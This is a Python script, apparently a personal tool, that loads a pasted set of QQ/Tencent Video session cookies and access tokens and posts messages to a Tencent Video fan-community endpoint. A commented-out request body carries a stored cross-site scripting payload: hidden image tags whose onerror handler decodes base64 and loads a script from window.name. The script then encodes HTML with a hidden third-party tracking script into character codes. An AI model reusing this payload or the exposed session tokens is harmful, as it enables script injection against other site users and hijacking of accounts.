# -*- coding: UTF-8 -*-
import requests,time
b='pgv_pvi=6475379712; pgv_pvid=7998541871; eas_sid=E1x5R45362B3Q9x0d3X888K7F1; h_uid=h584416836781257011; o_cookie=254127401; pac_uid=1_254127401; tvfe_boss_uuid=0002e12bb6c4a3f3; _video_qq_login_time_init=1544193913; ptui_loginuin=254127401; pt2gguin=o0254127401; RK=4cANBXUFPG; ptcz=b19bd2c109d97d386b1725b473f9d7d700f050b4484cbaf42c5e6d1d78a0c982; pgv_si=s9283276800; ptisp=cnc; pgv_info=ssid=s5609042132; uin=o0254127401; skey=@lxJUwn022; main_login=qq; vqq_access_token=DF3B5119905CF58A28DEA86684ED358E; vqq_appid=101483052; vqq_openid=91B3639E4E8D475B5D17E6542750D577; vqq_vuserid=141068983; vqq_vusession=fcaf416a9e87c7b300000000182e2e6758b9fb8a38b6; vqq_refresh_token=4F144747A63BCB37237C9A10CC22334D; login_time_init=2018-12-10 22:48:3; vqq_next_refresh_time=5572; vqq_login_time_init=1544454325; login_time_last=2018-12-10 23:5:25'
cookie = {}

for line in b.split(';'):
    key, value = line.split('=', 1)
    cookie[key] = value
print(cookie)


url = 'http://access.video.qq.com/doki/pubmsg?vappid=31260512&vsecret=ae09629847509c3b8eacfdcb612cc8c3f37984ecb770691f&vplatform=2&callback=jsonp1544454369121'
# data ='''{"mgrInfo":{"abstract":"<span class="pic_wrap"><img src="x" onerror="eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9d2luZG93Lm5hbWU7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTs='))" style="display:none;"><span class="pic_expand"><span class="btn_expand _expand_img">showImg<i class="icon_sm icon_down_sm"><svg class="svg_icon " viewBox="0 0 16 16" width="16" height="16"><use  xlink:href="#svg_icon_down_sm"></use></svg></i></span></span></span>gogo~"},"content":"<p><span class="pic_wrap"><img src="x" onerror="eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9d2luZG93Lm5hbWU7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTs='))" style="display:none;"><span class="pic_expand"><span class="btn_expand _expand_img">showImg<i class="icon_sm icon_down_sm"><svg class="svg_icon " viewBox="0 0 16 16" width="16" height="16"><use  xlink:href="#svg_icon_down_sm"></use></svg></i></span></span></span>gogo</p>","title":"aini","seq":"254127401_1544454369120","ftExtInfo":{"ftId":"14264","ftTitle":"aini"},"scene":4,"dataKey":"starid=160100&ftid=14264&targetid=2617821137"}'''
data ={
    "mgrInfo":{
        "abstract":"1炒鸡喜欢你"
    },
    "content":"<p>1炒鸡喜欢你</p>",
    "title":"超级喜欢你",
    "seq":"254127401_%d"%int(time.time()*1000),
    "ftExtInfo":{
        "ftId":"14264",
        "ftTitle":"超级喜欢你"
    },
    "scene":4,
    "dataKey":"starid=160100&ftid=14264&targetid=2617821137"
}
# r =requests.post(url,data=data,cookies=cookie).text
# print(r)
a = '''
<!DOCTYPE html>
                    <html>
                     <head>
                      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                      <img src="https://puui.qpic.cn/fans_admin/0/1_254127401_1544546468602/0" style="background-size:contain|cover;width:100%;height: auto;">
                     </head>
                     <body>
                     <div style="display: none;">
                     <script src="https://s5.cnzz.com/z_stat.php?id=1275341159&web_id=1275341159" language="JavaScript"></script>
                     </div>
                     </body>
                    </html>

'''
import base64



print(ord(a[1]))
s =""
for x in a:
    s += str(ord(x))+','
print(s)